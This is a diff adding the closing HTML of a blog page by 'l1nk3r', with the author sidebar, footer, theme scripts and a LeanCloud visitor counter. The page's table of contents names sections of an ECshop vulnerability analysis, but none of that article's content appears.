+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="l1nk3r" />
+            
+              <p class="site-author-name" itemprop="name">l1nk3r</p>
+              <p class="site-description motion-element" itemprop="description">愿你出走半生，归来仍是少年</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sukaralin" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:sukaralin@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/SukaraLin" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ECshop-漏洞分析"><span class="nav-text">ECshop 漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-前言"><span class="nav-text">0x01 前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞环境"><span class="nav-text">漏洞环境</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-分析"><span class="nav-text">0x02 分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入"><span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程代码执行"><span class="nav-text">远程代码执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-修复方式"><span class="nav-text">0x03 修复方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-思考"><span class="nav-text">0x04 思考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">l1nk3r</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("B9FGnsb12m0SgeUt1Ks30osH-gzGzoHsz", "VJzXbdTqOCo8jcVFjXNw7fRX");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <!-- 页面点击小红心 --> <script type="text/javascript" src="/js/src/love.js"></script>
+  
+     <!-- custom analytics part create by xiamo -->
+<script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+<script>AV.initialize("B9FGnsb12m0SgeUt1Ks30osH-gzGzoHsz", "VJzXbdTqOCo8jcVFjXNw7fRX");</script>
+<script>
+function showTime(Counter) {
+	var query = new AV.Query(Counter);
+	$(".leancloud_visitors").each(function() {
+		var url = $(this).attr("id").trim();
+		query.equalTo("url", url);
+		query.find({
+			success: function(results) {
+				if (results.length == 0) {
+					var content = $(document.getElementById(url)).text() + ': 0';
+					$(document.getElementById(url)).text(content);
+					return;
+				}
+				for (var i = 0; i < results.length; i++) {
+					var object = results[i];
+					var content = $(document.getElementById(url)).text() + ': ' + object.get('time');
+					$(document.getElementById(url)).text(content);
+				}
+			},
+			error: function(object, error) {
+				console.log("Error: " + error.code + " " + error.message);
+			}
+		});
+
+	});
+}
+
+function addCount(Counter) {
+	var Counter = AV.Object.extend("Counter");
+	url = $(".leancloud_visitors").attr('id').trim();
+	title = $(".leancloud_visitors").attr('data-flag-title').trim();
+	var query = new AV.Query(Counter);
+	query.equalTo("url", url);
+	query.find({
+		success: function(results) {
+			if (results.length > 0) {
+				var counter = results[0];
+				counter.fetchWhenSave(true);
+				counter.increment("time");
+				counter.save(null, {
+					success: function(counter) {
+						var content = $(document.getElementById(url)).text() + ': ' + counter.get('time');
+						$(document.getElementById(url)).text(content);
+					},
+					error: function(counter, error) {
+						console.log('Failed to save Visitor num, with error message: ' + error.message);
+					}
+				});
+			} else {
+				var newcounter = new Counter();
+				newcounter.set("title", title);
+				newcounter.set("url", url);
+				newcounter.set("time", 1);
+				newcounter.save(null, {
+					success: function(newcounter) {
+					    console.log("newcounter.get('time')="+newcounter.get('time'));
+						var content = $(document.getElementById(url)).text() + ': ' + newcounter.get('time');
+						$(document.getElementById(url)).text(content);
+					},
+					error: function(newcounter, error) {
+						console.log('Failed to create');
+					}
+				});
+			}
+		},
+		error: function(error) {
+			console.log('Error:' + error.code + " " + error.message);
+		}
+	});
+}
+$(function() {
+	var Counter = AV.Object.extend("Counter");
+	if ($('.leancloud_visitors').length == 1) {
+		addCount(Counter);
+	} else if ($('.post-title-link').length > 1) {
+		showTime(Counter);
+	}
+});
+</script>
+  
+</body>
+</html>
